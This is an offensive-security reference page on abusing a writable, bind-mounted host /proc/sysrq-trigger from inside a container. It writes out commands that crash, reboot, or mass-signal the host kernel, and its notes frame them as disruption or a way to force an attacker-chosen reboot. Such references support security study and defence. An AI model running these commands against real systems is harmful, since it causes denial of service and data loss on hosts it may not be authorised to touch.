---
title: "sysrq-trigger: driving host magic SysRq from a container"
description: "Abusing a bind-mounted /proc/sysrq-trigger to invoke the kernel's magic SysRq actions against the host, such as killing processes, thawing filesystems, or crashing and rebooting the machine, from inside a container."
keywords:
  - sysrq-trigger
  - magic sysrq
  - procfs escape
  - container host impact
  - denial of service
---

# sysrq-trigger

Writing a character to `/proc/sysrq-trigger` invokes the kernel's magic SysRq handler on the host. Unlike the helper knobs, it does not run an arbitrary program; it triggers fixed kernel actions, so its offensive value is host impact and disruption rather than code execution. It is reachable when a writable host `/proc` is mounted in.

```bash
# These act on the HOST kernel
echo c > /proc/sysrq-trigger      # crash the host (panic)
echo b > /proc/sysrq-trigger      # immediate reboot, no sync
echo e > /proc/sysrq-trigger      # send SIGTERM to all processes except init
```

## Exploitation notes

- The payoff is crashing, rebooting, or mass-signalling the host, which is useful for disruption or for forcing a reboot into an attacker-controlled state, not for a shell.
- It requires `/proc` to be the host's and writable; the masked `/proc/sysrq-trigger` of a default container is not writable.
- For code execution from the same mount, reach for [core_pattern](core_pattern.md) or [modprobe path](modprobe-path.md) instead.

## References

- [Kernel: Linux Magic System Request Key Hacks](https://www.kernel.org/doc/html/latest/admin-guide/sysrq.html)
- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
